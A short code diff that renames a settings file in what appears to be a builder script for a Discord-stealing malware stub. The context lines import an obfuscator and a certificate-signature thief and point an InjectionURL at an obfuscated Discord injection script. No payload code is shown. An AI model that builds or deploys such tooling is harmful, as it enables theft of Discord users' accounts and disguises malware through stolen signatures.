@@ -14,7 +14,7 @@ disable_warnings()
 import SkochOBF as obfuscator
 from sigthief import outputCert
 
-SettingsFile = "config.json"
+SettingsFile = "storeme.json"
 InCodeFile = "stub.py"
 OutCodeFile = "stub-o.py"
 InjectionURL = "https://github.com/skochwashere/Discord-Injection/blob/main/injection-obfuscated.js"
